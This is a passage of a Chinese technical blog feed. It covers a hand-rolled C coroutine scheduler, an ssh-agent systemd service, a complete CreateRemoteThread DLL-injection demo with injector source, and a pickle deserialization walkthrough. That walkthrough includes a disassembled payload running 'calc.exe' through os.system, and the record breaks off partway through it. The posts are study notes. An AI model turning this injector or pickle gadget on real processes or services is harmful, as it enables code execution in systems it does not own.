::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RSP])); __asm__(\u0026#34;movq %0, %%rbp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RBP])); __asm__(\u0026#34;movq %0, %%r8\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R8])); __asm__(\u0026#34;movq %0, %%r9\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R9])); __asm__(\u0026#34;movq %0, %%r10\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R10])); __asm__(\u0026#34;movq %0, %%r11\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R11])); __asm__(\u0026#34;movq %0, %%r12\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R12])); __asm__(\u0026#34;movq %0, %%r13\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R13])); __asm__(\u0026#34;movq %0, %%r14\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R14])); __asm__(\u0026#34;movq %0, %%r15\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R15])); return; } void wo_resume() { // 保存上下文  // 调度器运行在系统栈上，所以不保存栈，只记录寄存器  __asm__(\u0026#34;movq %%rbx, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RBX])); __asm__(\u0026#34;movq %%rcx, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RCX])); __asm__(\u0026#34;movq %%rdx, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RDX])); __asm__(\u0026#34;movq %%rsi, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RSI])); __asm__(\u0026#34;movq %%rdi, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RDI])); __asm__(\u0026#34;movq %%rsp, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RSP])); __asm__(\u0026#34;movq %%rbp, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_RBP])); __asm__(\u0026#34;movq %%r8, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R8])); __asm__(\u0026#34;movq %%r9, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R9])); __asm__(\u0026#34;movq %%r10, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R10])); __asm__(\u0026#34;movq %%r11, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R11])); __asm__(\u0026#34;movq %%r12, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R12])); __asm__(\u0026#34;movq %%r13, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R13])); __asm__(\u0026#34;movq %%r14, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R14])); __asm__(\u0026#34;movq %%r15, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;registers[REG_R15])); // 第一次进入时使用 call 方式，在栈底记录返回地址为 resume。  if (S-\u0026gt;C-\u0026gt;state == WO_STATE_READY) { S-\u0026gt;C-\u0026gt;state = WO_STATE_RUNNING; __asm__(\u0026#34;movq %0, %%rsp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;stack + STACK_SIZE)); __asm__(\u0026#34;movq %0, %%rbp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;stack + STACK_SIZE)); S-\u0026gt;C-\u0026gt;func(S-\u0026gt;C-\u0026gt;args); } else { S-\u0026gt;C-\u0026gt;state = WO_STATE_RUNNING; // 恢复协程上下文  __asm__(\u0026#34;movq %0, %%rbx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RBX])); __asm__(\u0026#34;movq %0, %%rcx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RCX])); __asm__(\u0026#34;movq %0, %%rdx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RDX])); __asm__(\u0026#34;movq %0, %%rsi\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RSI])); __asm__(\u0026#34;movq %0, %%rdi\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RDI])); __asm__(\u0026#34;movq %0, %%rsp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RSP])); __asm__(\u0026#34;movq %0, %%rbp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RBP])); __asm__(\u0026#34;movq %0, %%r8\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R8])); __asm__(\u0026#34;movq %0, %%r9\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R9])); __asm__(\u0026#34;movq %0, %%r10\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R10])); __asm__(\u0026#34;movq %0, %%r11\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R11])); __asm__(\u0026#34;movq %0, %%r12\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R12])); __asm__(\u0026#34;movq %0, %%r13\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R13])); __asm__(\u0026#34;movq %0, %%r14\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R14])); __asm__(\u0026#34;movq %0, %%r15\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R15])); return; } // 协程结束时会返回到 resume  // 此时上下文是协程栈，直接 return 会跑飞，所以还需要 yield 切换回系统栈  // 再在 schedule 里从链表移除协程  S-\u0026gt;C-\u0026gt;state = WO_STATE_EXITED; wo_exit(); }   此处关于 inline assembly 的写法，在最后会给出在线手册地址。\nyield yield 负责保存协程的运行状态。因为协程栈是独立独享的，所以无需对协程栈做备份操作，只需要保存寄存器信息。\n恢复调度器上下文的原理和resume的原理一样，只要保证yield和resume的栈帧大小一致清栈操作后rsp落到正确返回地址上，即可在恢复寄存器后直接return，就像是在 resume 里 return 一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  void wo_yield(void) { S-\u0026gt;C-\u0026gt;state = WO_STATE_SUSPENDED; // 保存协程上下文  __asm__(\u0026#34;movq %%rbx, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RBX])); __asm__(\u0026#34;movq %%rcx, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RCX])); __asm__(\u0026#34;movq %%rdx, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RDX])); __asm__(\u0026#34;movq %%rsi, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RSI])); __asm__(\u0026#34;movq %%rdi, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RDI])); __asm__(\u0026#34;movq %%rsp, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RSP])); __asm__(\u0026#34;movq %%rbp, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_RBP])); __asm__(\u0026#34;movq %%r8, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R8])); __asm__(\u0026#34;movq %%r9, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R9])); __asm__(\u0026#34;movq %%r10, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R10])); __asm__(\u0026#34;movq %%r11, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R11])); __asm__(\u0026#34;movq %%r12, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R12])); __asm__(\u0026#34;movq %%r13, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R13])); __asm__(\u0026#34;movq %%r14, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R14])); __asm__(\u0026#34;movq %%r15, %0\u0026#34; : \u0026#34;=m\u0026#34;(S-\u0026gt;C-\u0026gt;registers[REG_R15])); // 恢复调度器上下文  // 调度器独享系统栈所以不用复制栈，仅恢复寄存器状态  __asm__(\u0026#34;movq %0, %%rbx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RBX])); __asm__(\u0026#34;movq %0, %%rcx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RCX])); __asm__(\u0026#34;movq %0, %%rdx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RDX])); __asm__(\u0026#34;movq %0, %%rsi\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RSI])); __asm__(\u0026#34;movq %0, %%rdi\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RDI])); __asm__(\u0026#34;movq %0, %%rsp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RSP])); __asm__(\u0026#34;movq %0, %%rbp\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RBP])); __asm__(\u0026#34;movq %0, %%r8\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R8])); __asm__(\u0026#34;movq %0, %%r9\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R9])); __asm__(\u0026#34;movq %0, %%r10\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R10])); __asm__(\u0026#34;movq %0, %%r11\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R11])); __asm__(\u0026#34;movq %0, %%r12\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R12])); __asm__(\u0026#34;movq %0, %%r13\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R13])); __asm__(\u0026#34;movq %0, %%r14\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R14])); __asm__(\u0026#34;movq %0, %%r15\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_R15])); return; }   使用 几个简单的用例。\n单线程多协程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  void co1(void *args) { for (int n = 5; n \u0026gt;= 0; n -= 2) { printf(\u0026#34;co1: n=%d\\n\u0026#34;, n); wo_yield(); } return; } void co2(void *args) { for (int n = 4; n \u0026gt;= 0; n -= 2) { printf(\u0026#34;co2: n=%d\\n\u0026#34;, n); wo_yield(); } return; } void greeting(void *args) { for (int i = 0; i \u0026lt; 6; i++) { wo_yield(); } printf(\u0026#34;greeting: %s\u0026#34;, (const char *)args); return; } void run_single(void) { wo_start(co1, NULL); wo_start(co2, NULL); wo_start(greeting, \u0026#34;Hello world!\\n\u0026#34;); wo_main(); printf(\u0026#34;run single end.\\n\u0026#34;); }   多线程多协程 这个用例展示多个线程同时使用 wo_main() 启动协程调度器时的场景。未来如果有机会的话应该会再让多线程中的调度器调度对方的协程，甚至启动新调度器，就像 go 的 goroutine 一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  int thrd1(void *args) { wo_start(co1, NULL); wo_start(co2, NULL); wo_start(greeting, \u0026#34;Hello world!\\n\u0026#34;); wo_main(); return 0; } int thrd2(void *args) { wo_start(co1, NULL); wo_start(co2, NULL); wo_start(greeting, \u0026#34;Hello world!\\n\u0026#34;); wo_main(); return 0; } void run_parallels(void) { thrd_t t1, t2; thrd_create(\u0026amp;t1, thrd1, NULL); thrd_create(\u0026amp;t2, thrd2, NULL); thrd_join(t1, NULL); thrd_join(t2, NULL); printf(\u0026#34;run parallels end.\\n\u0026#34;); }   总结 参考资料列出如下。\n GCC inline assembly HOWTO cloudwu/coroutine 云风coroutine协程库源码分析，评论区有些相关的项目和资料，谨慎参考。 Coroutine in C Language getcontext implementation  这里手写汇编代码显然有问题，比如我存了所有通用寄存器但没有存 FPU 和 FLAGS 的状态，也没有存段寄存器。ucontext的实现考虑周全得多，用 jmp 也比我用 return 的形式好。再比如协程栈不能自动扩容，只有一个固定大小。\n再对比 libco 的话，还缺少非常关键的系统调用异步化改造，让 io 时能自动 yield ，准备就绪后再继续执行。\n我都不知道算不算摸到了云风大佬十年前水平的边角，太菜了我。\n","date":"2022-08-05T19:41:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%8D%8F%E7%A8%8B%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0/","title":"协程原理和实现"},{"content":"前言 翻到一本Windows编程书上介绍 DLL 注入，简单验证了一下并做个记录。\n同时书上还介绍了另一种代码注入方法，APC 注入，有时间验证了再另写一篇。\n原理 CreateRemoteThread 注入 DLL 的大体流程如下。\n OpenProcess 打开目标进程，受害进程权限高的话可能要特权。 VirtualAllocEx 在目标进程的地址空间里分配足够存放待注入 DLL 路径的空间。 WriteProcessMemory 在目标进程写 DLL 路径，位置是上一步分配好的地址。 GetProcAddress(GetModuleHandle(\u0026quot;kernel32.dll\u0026quot;), \u0026quot;LoadLibraryA\u0026quot;) 待调用函数地址。 CreateRemoteThread 在目标进程里启动线程，线程入口就是 LoadLibraryA。  整个流程就是在目标进程的地址空间里写好参数（1~3步），然后调一个已经存在于目标进程地址空间中的函数（kernel32.dll里的LoadLibraryA）加载我们的 DLL（4~5步）。\n其中有个坑值得注意下：\n DLL injection with CreateRemoteThread - stackoverflow\nThe thing confuses me is that GetProcAddress returns the LoadLibraryA fucntion address of the current process, how can you pass it as a parameter to CreateRemoteThread and expect the target process to run it?\naccepted answer:\n It works by accident. It is a very common accident, Microsoft makes a great deal of effort to ensure that the operating system DLLs, like kernel32.dll, have a base address that doesn\u0026rsquo;t conflict with any other DLLs. Further enhanced by kernel32.dll getting loaded very early at process initialization so low odds that it has to fight to get its preferred base address.\nYou\u0026rsquo;ll get away with easily. It is notable that this has gone wrong in the past, there was an XP security update oops that caused gdi32.dll to get relocated and made lots of machines fall over at boot. The correct way is fairly painful, CreateToolhelp32Snapshot() + Module32First/Next() to find the relocation offset isn\u0026rsquo;t great joy. Frankly, you probably ought to not do this at all if the operating system is \u0026ldquo;weird\u0026rdquo; like that.\n  在第四步使用 GetProcAddress 拿到的显然是当前进程地址空间里 LoadLibraryA 的地址，但另一个进程的地址空间里，LoadLibraryA 也是在同样的地址上吗？说好的地址空间随机化呢？\n从上面贴出的 stackoverflow 链接里，可以看到相关的讨论。主要就是两个观点：\n works by accident (very common accident). Microsoft intentionally implemented it.  没有查找到更权威的说法的情况下暂且按下不谈。\n案例 案例分三个部分：\n injector，注入者，负责执行 DLL 注入。 payload，待注入的 DLL，里面仅输出一行文字标识注入成功。 victim，一个简单的猜数字游戏，在案例中扮演受害者。  使用 cmake 编译。所有源码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  // injector.cpp #include \u0026lt;iostream\u0026gt; #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;Psapi.h\u0026gt; LPCSTR libPath = \u0026#34;D:\\\\repos\\\\windows-codeinjection\\\\build\\\\Debug\\\\payload.dll\u0026#34;; int main() { // 从命令行读被注入进程的ID  DWORD pid = 0; std::cin \u0026gt;\u0026gt; pid; if (pid == 0) { std::cout \u0026lt;\u0026lt; \u0026#34;invalid pid input\u0026#34; \u0026lt;\u0026lt; std::endl; } // 打开被注入进程  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if (NULL == hProcess) { return 1; } // 在目标进程里分配存放 DLL 路径的空间  LPVOID lpRemoteDllName = VirtualAllocEx(hProcess, NULL, strlen(libPath) + 1, MEM_COMMIT, PAGE_READWRITE); if (lpRemoteDllName == NULL) { std::cout \u0026lt;\u0026lt; \u0026#34;[ERROR] VirtualAllocEx failed, last error \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; return -1; } // 写入 DLL 路径  if (WriteProcessMemory(hProcess, lpRemoteDllName, libPath, strlen(libPath) + 1, NULL) == FALSE) { std::cout \u0026lt;\u0026lt; \u0026#34;[ERROR] WriteProcessMemory failed, last error \u0026#34; \u0026lt;\u0026lt; GetLastError() \u0026lt;\u0026lt; std::endl; return -1; } // 从本进程地址空间读取 LoadLibraryA 函数的地址  LPVOID lpProcAddr = (LPVOID)GetProcAddress(GetModuleHandle(\u0026#34;kernel32.dll\u0026#34;), \u0026#34;LoadLibraryA\u0026#34;); // 在目标进程创建线程，执行 LoadLibraryA(我们的DLL路径)  HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)lpProcAddr, (LPVOID)lpRemoteDllName, NULL, NULL); // 收尾  if (WaitForSingleObject(hThread, INFINITE) != WAIT_OBJECT_0) { CloseHandle(hProcess); return 0; } DWORD exitCode = 0; GetExitCodeThread(hThread, \u0026amp;exitCode); std::cout \u0026lt;\u0026lt; \u0026#34;thread exit with code \u0026#34; \u0026lt;\u0026lt; exitCode \u0026lt;\u0026lt; std::endl; CloseHandle(hProcess); return -1; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // victim.cpp #include \u0026lt;cmath\u0026gt;#include \u0026lt;iostream\u0026gt; #include \u0026lt;Windows.h\u0026gt; int main() { int guess; int result = std::rand(); DWORD pid = GetCurrentProcessId(); std::cout \u0026lt;\u0026lt; \u0026#34;current process id: \u0026#34; \u0026lt;\u0026lt; pid \u0026lt;\u0026lt; std::endl; for (;;) { std::cin \u0026gt;\u0026gt; guess; if (guess \u0026gt; result) { std::cout \u0026lt;\u0026lt; \u0026#34;too big\u0026#34; \u0026lt;\u0026lt; std::endl; } else if (guess \u0026lt; result) { std::cout \u0026lt;\u0026lt; \u0026#34;too small\u0026#34; \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;correct!\u0026#34; \u0026lt;\u0026lt; std::endl; break; } } return 0; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  // payload.cpp #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; BOOL WINAPI DllMain( HINSTANCE hinstDLL, // handle to DLL module  DWORD fdwReason, // reason for calling function  LPVOID lpReserved) // reserved { // Perform actions based on the reason for calling.  switch (fdwReason) { case DLL_PROCESS_ATTACH: // Initialize once for each new process.  // Return FALSE to fail DLL load.  std::cout \u0026lt;\u0026lt; \u0026#34;dll injected!\u0026#34; \u0026lt;\u0026lt; std::endl; break; case DLL_THREAD_ATTACH: // Do thread-specific initialization.  break; case DLL_THREAD_DETACH: // Do thread-specific cleanup.  break; case DLL_PROCESS_DETACH: // Perform any necessary cleanup.  break; } return TRUE; // Successful DLL_PROCESS_ATTACH. }   1 2 3 4 5 6 7 8 9 10 11  # CMakeLists.txt cmake_minimum_required(VERSION 3.20)project( windows-codeinjection VERSION 0.1.0 LANGUAGES CXX )add_executable(injector injector/main.cpp)add_executable(victim victim/main.cpp)add_library(payload SHARED payload/main.cpp)  最终验证结果\n总结 哈，魔术师的秘密。\n","date":"2022-07-11T15:10:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/","title":"基于CreateRemoteThread的DLL注入"},{"content":"前言 主要是想解决一个问题：ssh 只自动尝试了 ~/.ssh/id_ed25519 这个硬编码的路径，但我有两个 ed25519 秘钥（工作用一个，私人一个），除非用 ssh -i 指定不然不会被自动发现和使用。\n但我又不想多打个 -i ~/.ssh/id_ed25519.xxx ，所以就想配个 ssh-agent 好了，手动ssh-add 还是自动都可。\n配置 创建服务配置 位置：~/.config/systemd/user/ssh-agent.service\n内容\n1 2 3 4 5 6 7 8 9 10  [Unit] Description=SSH key agent [Service] Type=simple Environment=SSH_AUTH_SOCK=%t/ssh-agent.socket ExecStart=/usr/bin/ssh-agent -D -a $SSH_AUTH_SOCK [Install] WantedBy=default.target   添加 SSH_AUTH_SOCK DEFAULT=\u0026quot;${XDG_RUNTIME_DIR}/ssh-agent.socket\u0026quot; 到 ~/.pam_environment。\n在我的系统上 XDG_RUNTIME_DIR 对应 /run/user/你的用户id ，不同发行版自己看下这个全局变量对应哪个位置。\n1  echo SSH_AUTH_SOCK DEFAULT=\u0026#34;${XDG_RUNTIME_DIR}/ssh-agent.socket\u0026#34; | tee -a ~/.pam_environment   可选，自动添加秘钥（OpenSSH版本\u0026gt;=7.2）：\n1  echo \u0026#39;AddKeysToAgent yes\u0026#39; \u0026gt;\u0026gt; ~/.ssh/config   启用服务 1 2  systemctl --user enable ssh-agent systemctl --user start ssh-agent   重新登录后生效。\n总结 参考：How to start and use ssh-agent as systemd service?\n","date":"2022-06-27T11:17:00+08:00","permalink":"https://nnnewb.github.io/blog/p/systemd-%E9%85%8D%E7%BD%AE-ssh-agent-%E7%94%A8%E6%88%B7%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF/","title":"systemd 配置 ssh-agent 用户服务自启"},{"content":"前言 挑了个好捏的软柿子下手，来看下反序列化漏洞一般什么原理。\n原理 概述 Python 是个动态类型且高度灵活的语言，这意味着直接按内存布局序列化基本是没戏的。想序列化一个Python中的实例，很大程度要依靠Python的高度灵活性。\npickle 是一种 Python 的序列化库（或者，序列化协议？），其优势是几乎能序列化任何 Python 对象，但为了实现这种优势，pickle 会根据输入而执行指定的函数，从而造成RCE。\n可以用 fickling 和 pickletools 这两个工具分析 pickle 序列化后的字节序列。\n反序列化 接着分析下序列化后的这些数据是怎么还原成 Python 对象的。以 pickle.dumps([1,2,3]) 的结果为例，以 pickletools.dis 还原成字节码，Python 3.7.9 pickle 模块源码 pickle.py\n1 2 3 4 5 6 7 8 9  0: \\x80 PROTO 3 2: ] EMPTY_LIST 3: q BINPUT 0 5: ( MARK 6: K BININT1 1 8: K BININT1 2 10: K BININT1 3 12: e APPENDS (MARK at 5) 13: . STOP   pickle 反序列化是一个类似基于栈的虚拟机，上面恢复的字节码等于这个虚拟机的汇编指令。上面第一列是偏移值，单位字节。第二、三列理解成指令，第四列自然是操作数。\n然后我们看 pickle.py 中如何把上面这些”指令“恢复成 Python 对象。\nvm模型 先看 pickle.py 中的 _Unpickler 类，跳转到load方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  def load(self): \u0026#34;\u0026#34;\u0026#34;Read a pickled object representation from the open file. Return the reconstituted object hierarchy specified in the file. \u0026#34;\u0026#34;\u0026#34; # Check whether Unpickler was initialized correctly. This is # only needed to mimic the behavior of _pickle.Unpickler.dump(). if not hasattr(self, \u0026#34;_file_read\u0026#34;): raise UnpicklingError(\u0026#34;Unpickler.__init__() was not called by \u0026#34; \u0026#34;%s.__init__()\u0026#34; % (self.__class__.__name__,)) self._unframer = _Unframer(self._file_read, self._file_readline) self.read = self._unframer.read self.readline = self._unframer.readline self.metastack = [] self.stack = [] self.append = self.stack.append self.proto = 0 read = self.read dispatch = self.dispatch try: while True: key = read(1) if not key: raise EOFError assert isinstance(key, bytes_types) dispatch[key[0]](self) except _Stop as stopinst: return stopinst.value   这里已经出现了核心逻辑和最重要的几个属性：stack、metastack、dispatch。\nstack顾名思义即可，dispatch则是一个 opcode 到 _Unpickler 方法的映射字典。opcode 定义在这个文件的 98~179 行。\n在重要数据结构初始化后，接下来是主循环，从输入中读key（指令），派发执行。\nPROTO 回顾上一节的字节码，我们从 PROTO 3 开始看 pickle 如何处理这些指令。\n1 2 3 4 5 6  def load_proto(self): proto = self.read(1)[0] if not 0 \u0026lt;= proto \u0026lt;= HIGHEST_PROTOCOL: raise ValueError(\u0026#34;unsupported pickle protocol: %d\u0026#34; % proto) self.proto = proto dispatch[PROTO[0]] = load_proto   PROTO 3 指令读了操作数 3 并赋值。注意看\n1 2  0: \\x80 PROTO 3 2: ] EMPTY_LIST   PROTO 3 正好 2 字节，在load中读取的第一个字节表示proto指令，操作数3是第二个字节。\nEMPTY_LIST  EMPTY_LIST 我们继续看这个指令。\n1 2 3  def load_empty_list(self): self.append([]) dispatch[EMPTY_LIST[0]] = load_empty_list   self.append 是 self.stack.append 的别名，我们在 load 函数定义里已经知道了这一点。这一步往栈中压了一个空的列表list。\nBINPUT BINPUT 0\n1 2 3 4 5 6  def load_binput(self): i = self.read(1)[0] if i \u0026lt; 0: raise ValueError(\u0026#34;negative BINPUT argument\u0026#34;) self.memo[i] = self.stack[-1] dispatch[BINPUT[0]] = load_binput   在PUT系列指令的定义处有注释：\n1 2 3  PUT = b\u0026#39;p\u0026#39; # store stack top in memo; index is string arg BINPUT = b\u0026#39;q\u0026#39; # \u0026#34; \u0026#34; \u0026#34; \u0026#34; \u0026#34; ; \u0026#34; \u0026#34; 1-byte arg LONG_BINPUT = b\u0026#39;r\u0026#39; # \u0026#34; \u0026#34; \u0026#34; \u0026#34; \u0026#34; ; \u0026#34; \u0026#34; 4-byte arg   BINPUT 指令的含义是将栈顶变量（空列表）放到 memo 中（理解为寄存器？）。这个指令的操作数就相当于是寄存器名了。\nMARK 1 2 3 4  0: \\x80 PROTO 3 2: ] EMPTY_LIST 3: q BINPUT 0 5: ( MARK   1 2 3 4 5 6 7 8 9  MARK = b\u0026#39;(\u0026#39; # push special markobject on stack # ... def load_mark(self): self.metastack.append(self.stack) self.stack = [] self.append = self.stack.append dispatch[MARK[0]] = load_mark   MARK 指令将栈压到了 metastack 中，替换了当前栈。应该是一个类似栈帧的机制。\nBININT 1 2 3 4  BININT = b\u0026#39;J\u0026#39; # push four-byte signed int BININT1 = b\u0026#39;K\u0026#39; # push 1-byte unsigned int LONG = b\u0026#39;L\u0026#39; # push long; decimal string argument BININT2 = b\u0026#39;M\u0026#39; # push 2-byte unsigned int   BININT 系列的指令都是压栈一个操作数。在MARK指令后，是连续的三条BININT1指令。\n1 2 3 4  5: ( MARK 6: K BININT1 1 8: K BININT1 2 10: K BININT1 3   APPENDS 1 2  10: K BININT1 3 12: e APPENDS (MARK at 5)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  def load_appends(self): items = self.pop_mark() list_obj = self.stack[-1] try: extend = list_obj.extend except AttributeError: pass else: extend(items) return # Even if the PEP 307 requires extend() and append() methods, # fall back on append() if the object has no extend() method # for backward compatibility. append = list_obj.append for item in items: append(item) dispatch[APPENDS[0]] = load_appends   appends将memo中保存的前一个栈弹出，然后把当前栈上的所有值压到前一个栈顶的空列表中。如此就成功得到了我们输入的列表。\nSTOP 最后的 STOP 指令没有操作数。\n1 2 3 4  def load_stop(self): value = self.stack.pop() raise _Stop(value) dispatch[STOP[0]] = load_stop   效果也很简单，将栈顶的对象弹出，这个对象就是最终被 pickle 恢复完成的对象了。\nRCE利用 pickle 的反序列化任意代码执行漏洞来自 pickle 序列化/反序列化实例的一种约定，即__reduce__魔术方法。\n对自定义类的实例，pickle 没法保证一定能还原出原对象。比如类里包含一个打开了的文件描述符，fd是没法保存的，程序一重启先前保存的 fd 就失效了，如果要恢复唯一的办法就是重新打开一次，或重新构造一次这个实例。\n提供 __reduce__ 魔术方法以允许 pickle 将当前对象转为一系列构造和恢复实例所需的参数：类型、构造参数、状态参数等。\n一般对 __reduce__ 的利用就是构造参数的部分，将构造方法指定为 os.system 即可执行任意命令。\n同样这里提供一个例子，在反序列化时会弹出计算器。\n1 2 3 4 5 6 7 8 9 10 11 12  0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;nt system\u0026#39; 13: q BINPUT 0 15: X BINUNICODE \u0026#39;calc.exe\u0026#39; 28: q BINPUT 1 30: \\x85 TUPLE1 31: q BINPUT 2 33: R REDUCE 34: q BINPUT 3 36: . STOP highest protocol among opcodes = 2 None   接着我们具体分析我们没见过的指令。\nGLOBAL 1 2 3 4 5 6  def load_global(self): module = self.readline()[:-1].decode(\u0026#34;utf-8\u0026#34;) name = self.readline()[:-1].decode(\u0026#34;utf-8\u0026#34;) klass = self.find_class(module, name) self.append(klass) dispatch[GLOBAL[0]] = load_global   global 指令查找指定的模块，注意find_class并不只找类，函数也能被找出来。这一条指令执行后，栈顶保存的就是 nt.system 了。\nBINUNICODE 1 2  13: q BINPUT 0 15: X BINUNICODE 